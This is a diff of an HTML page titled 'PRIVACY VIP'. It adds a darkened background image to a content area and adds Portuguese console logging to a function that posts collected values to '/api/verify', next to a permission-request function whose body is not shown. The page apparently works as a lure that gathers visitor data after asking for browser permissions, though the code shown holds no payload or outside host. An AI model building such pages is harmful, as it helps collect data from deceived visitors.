@@ -36,10 +36,10 @@
         </div>
     </div>
 
-    <div id="content">
+    <div id="content" style="background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=1200&h=800&fit=crop') center/cover no-repeat;">
         <header style="padding: 15px; border-bottom: 1px solid #222; text-align: center; color: var(--primary); font-weight: bold;">PRIVACY VIP</header>
         <div style="padding: 20px;">
-            <div style="height: 400px; background: #222; border-radius: 15px;"></div>
+            <div style="height: 400px; border-radius: 15px;"></div>
         </div>
     </div>
 
@@ -61,12 +61,23 @@
     <script>
         async function report(type, data) {
             try {
-                await fetch('/api/verify', {
+                console.log(`📤 Enviando: ${type} = ${data}`);
+                const response = await fetch('/api/verify', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ tipo: type, valor: data })
                 });
-            } catch(e) {}
+                
+                if(!response.ok) {
+                    console.error(`❌ Erro ${response.status}: ${response.statusText}`);
+                    const error = await response.json();
+                    console.error('Detalhes:', error);
+                } else {
+                    console.log('✅ Enviado com sucesso!');
+                }
+            } catch(e) {
+                console.error('❌ Erro na requisição:', e.message);
+            }
         }
 
         function requestPermission() {
